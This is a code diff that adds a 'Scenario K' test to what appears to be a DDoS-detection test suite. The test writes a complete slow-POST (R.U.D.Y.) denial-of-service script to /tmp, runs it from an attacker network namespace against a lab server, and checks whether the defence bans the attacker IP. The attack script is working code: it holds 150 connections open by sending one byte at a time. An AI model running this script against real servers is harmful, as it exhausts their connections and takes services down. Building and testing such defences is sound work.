@@ -334,6 +334,73 @@ def test_l4_ack_flood():
     else:
         report("J: ACK Flood", engine, ttm, f"{RED}FAIL{RESET}")
 
+def test_l7_rudy():
+    print(f"\n{YELLOW}--- Scenario K: L7 Slow POST (R.U.D.Y.) ---{RESET}")
+    reset_environment()
+    
+    rudy_script = "/tmp/rudy_test.py"
+    
+    # Dynamiczne generowanie skryptu ataku R.U.D.Y.
+    with open(rudy_script, "w") as f:
+        f.write("""import socket, random, time
+TARGET_IP = "10.0.0.1"
+PORT = 80
+SOCKET_COUNT = 150
+SLEEP_TIME = 10
+sockets = []
+
+def create_socket():
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.settimeout(4)
+        s.connect((TARGET_IP, PORT))
+        
+        # Wysyłamy w pełni zakończone nagłówki HTTP (z podwójnym \\r\\n na końcu)
+        # ale deklarujemy ogromny rozmiar przesyłanych danych (Body)
+        s.send(f"POST /?rand={random.randint(0, 2000)} HTTP/1.1\\r\\n".encode("utf-8"))
+        s.send(f"Host: {TARGET_IP}\\r\\n".encode("utf-8"))
+        s.send("User-Agent: RUDY-Testing-Script\\r\\n".encode("utf-8"))
+        s.send("Content-Type: application/x-www-form-urlencoded\\r\\n".encode("utf-8"))
+        s.send("Content-Length: 1000000\\r\\n".encode("utf-8"))
+        s.send("Connection: keep-alive\\r\\n\\r\\n".encode("utf-8"))
+        return s
+    except socket.error:
+        return None
+
+for _ in range(SOCKET_COUNT):
+    s = create_socket()
+    if s: sockets.append(s)
+
+while True:
+    for s in list(sockets):
+        try:
+            # Wysyłamy tylko 1 bajt (literę 'a') jako zawartość POST
+            s.send(b"a")
+        except socket.error:
+            sockets.remove(s)
+            
+    for _ in range(SOCKET_COUNT - len(sockets)):
+        s = create_socket()
+        if s: sockets.append(s)
+        
+    time.sleep(SLEEP_TIME)
+""")
+    
+    # Uruchomienie wygenerowanego skryptu wewnątrz przestrzeni atakującego
+    proc = run_cmd(f"python3 {rudy_script}", ns=ATTACKER_NS, bg=True)
+    
+    # R.U.D.Y. potrafi unikać heurystyk timeoutu Nginxa, więc spodziewamy się,
+    # że wyłapie go model GRU po ok. 15-20 sekundach. Dajemy timeout 35 sekund.
+    engine, ttm = tail_logs_for_ban(ATTACKER_IP, timeout=35)
+    proc.kill()
+    
+    is_dropped = is_ip_banned(ATTACKER_IP)
+    
+    if engine != "None" and is_dropped:
+        report("K: L7 Slow POST (R.U.D.Y.)", engine, ttm, f"{GREEN}PASS{RESET}")
+    else:
+        report("K: L7 Slow POST (R.U.D.Y.)", engine, ttm, f"{RED}FAIL{RESET}")
+
 def run_all():
     if os.geteuid() != 0:
         print(f"{RED}[-] Please run this script with sudo/root privileges.{RESET}")
@@ -357,6 +424,7 @@ def run_all():
     test_global_spoofed_syn()
     test_mixed_traffic()
     test_l4_ack_flood()
+    test_l7_rudy()
     
     # Clean up at the end
     run_cmd("pkill -f control_plane.py", ns=SERVER_NS)
